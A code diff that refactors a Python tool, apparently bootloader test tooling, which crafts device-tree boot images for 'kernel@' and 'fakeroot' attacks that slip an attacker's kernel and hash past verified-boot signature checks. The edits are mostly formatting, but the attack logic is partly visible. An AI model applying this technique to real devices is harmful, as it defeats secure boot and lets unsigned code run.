@@ -107,7 +107,7 @@ def determine_offset(dt_struct, dt_strings, searched_node_name):
 
             offset += len_tag
 
-            node_path = path + '/' + str(prop_name)
+            node_path = f'{path}/{str(prop_name)}'
 
             if node_path == searched_node_name:
                 object_start_offset = begin_prop_offset
@@ -218,7 +218,7 @@ def change_property_value(dt_struct, dt_strings, prop_path, prop_value,
     if rt_node_start is None:
         if not required:
             return dt_struct
-        raise ValueError('Fatal error, unable to find prop %s' % prop_path)
+        raise ValueError(f'Fatal error, unable to find prop {prop_path}')
 
     dt_struct = modify_prop_content(dt_struct, rt_node_start, prop_value)
 
@@ -270,9 +270,7 @@ def get_prop_value(dt_struct, dt_strings, prop_path):
     (len_tag,) = struct.unpack('>I', dt_struct[offset:offset + 4])
 
     offset += 8
-    tag_data = dt_struct[offset:offset + len_tag]
-
-    return tag_data
+    return dt_struct[offset:offset + len_tag]
 
 
 def kernel_at_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
@@ -298,20 +296,21 @@ def kernel_at_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
         dt_struct, dt_strings, '/configurations/default')
     default_conf_name = str(default_conf_name[:-1], 'utf-8')
 
-    conf_path = '/configurations/' + default_conf_name
+    conf_path = f'/configurations/{default_conf_name}'
 
     # fetch the loaded kernel name from the default configuration
-    loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')
+    loaded_kernel = get_prop_value(dt_struct, dt_strings, f'{conf_path}/kernel')
 
     loaded_kernel = str(loaded_kernel[:-1], 'utf-8')
 
-    if loaded_kernel.find('@') != -1:
+    if '@' in loaded_kernel:
         print('kernel@ attack does not work on nodes already containing an @ sign!')
         sys.exit()
 
     # determine boundaries of the loaded kernel
-    (krn_node_start, krn_node_end) = (determine_offset(
-        dt_struct, dt_strings, '/images/' + loaded_kernel))
+    (krn_node_start, krn_node_end) = determine_offset(
+        dt_struct, dt_strings, f'/images/{loaded_kernel}'
+    )
     if krn_node_start is None and krn_node_end is None:
         print('Fatal error, unable to find root node')
         sys.exit()
@@ -323,19 +322,31 @@ def kernel_at_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
     dt_struct = dt_struct[:krn_node_start] + \
         loaded_kernel_copy + dt_struct[krn_node_start:]
 
-    evil_kernel_name = loaded_kernel+'@evil'
+    evil_kernel_name = f'{loaded_kernel}@evil'
 
     # change the inserted kernel name
     dt_struct = change_node_name(
-        dt_struct, dt_strings, '/images/' + loaded_kernel, bytes(evil_kernel_name, 'utf-8'))
+        dt_struct,
+        dt_strings,
+        f'/images/{loaded_kernel}',
+        bytes(evil_kernel_name, 'utf-8'),
+    )
 
     # change the content of the kernel being loaded
     dt_struct = change_property_value(
-        dt_struct, dt_strings, '/images/' + evil_kernel_name + '/data', kernel_content)
+        dt_struct,
+        dt_strings,
+        f'/images/{evil_kernel_name}/data',
+        kernel_content,
+    )
 
     # change the content of the kernel being loaded
     dt_struct = change_property_value(
-        dt_struct, dt_strings, '/images/' + evil_kernel_name + '/hash-1/value', kernel_hash)
+        dt_struct,
+        dt_strings,
+        f'/images/{evil_kernel_name}/hash-1/value',
+        kernel_hash,
+    )
 
     return dt_struct
 
@@ -357,10 +368,10 @@ def fake_root_node_attack(dt_struct, dt_strings, kernel_content, kernel_digest):
         dt_struct, dt_strings, '/configurations/default')
     default_conf_name = str(default_conf_name[:-1], 'utf-8')
 
-    conf_path = '/configurations/'+default_conf_name
+    conf_path = f'/configurations/{default_conf_name}'
 
     # fetch the loaded kernel name from the default configuration
-    loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')
+    loaded_kernel = get_prop_value(dt_struct, dt_strings, f'{conf_path}/kernel')
 
     loaded_kernel = str(loaded_kernel[:-1], 'utf-8')
 
@@ -386,7 +397,7 @@ def fake_root_node_attack(dt_struct, dt_strings, kernel_content, kernel_digest):
                                       EVIL_KERNEL_NAME + b'\0')
 
     # change the node of the /<fake_root_name>/images/<original_kernel_name>
-    images_path = base + '/images/'
+    images_path = f'{base}/images/'
     node_path = images_path + loaded_kernel
     dt_struct = change_node_name(dt_struct, dt_strings, node_path,
                                  EVIL_KERNEL_NAME)
@@ -425,7 +436,7 @@ def add_evil_node(in_fname, out_fname, kernel_fname, attack):
     with open(in_fname, 'rb') as fin:
         input_data = fin.read()
 
-    hdr = input_data[0:0x28]
+    hdr = input_data[:0x28]
 
     offset = 0
     magic = struct.unpack('>I', hdr[offset:offset + 4])[0]
@@ -477,8 +488,9 @@ def add_evil_node(in_fname, out_fname, kernel_fname, attack):
 
 if __name__ == '__main__':
     if len(sys.argv) != 5:
-        print('usage: %s <input_filename> <output_filename> <kernel_binary> <attack_name>' %
-              sys.argv[0])
+        print(
+            f'usage: {sys.argv[0]} <input_filename> <output_filename> <kernel_binary> <attack_name>'
+        )
         print('valid attack names: [fakeroot, kernel@]')
         sys.exit(1)
 
